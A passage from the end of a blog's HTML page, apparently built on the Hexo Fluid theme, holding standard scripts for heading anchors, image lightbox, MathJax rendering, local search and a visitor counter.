    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        MathJax = {
          tex    : {
            inlineMath: { '[+]': [['$', '$']] }
          },
          loader : {
            load: ['ui/lazy']
          },
          options: {
            renderActions: {
              findScript    : [10, doc => {
                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                  const display = !!node.type.match(/; *mode=display/);
                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                  const text = document.createTextNode('');
                  node.parentNode.replaceChild(text, node);
                  math.start = { node: text, delim: '', n: 0 };
                  math.end = { node: text, delim: '', n: 0 };
                  doc.math.push(math);
                });
              }, '', false],
              insertedScript: [200, () => {
                document.querySelectorAll('mjx-container').forEach(node => {
                  let target = node.parentNode;
                  if (target.nodeName.toLowerCase() === 'li') {
                    target.parentNode.classList.add('has-jax');
                  }
                });
              }, '', false]
            }
          }
        };
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/js/caidai.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
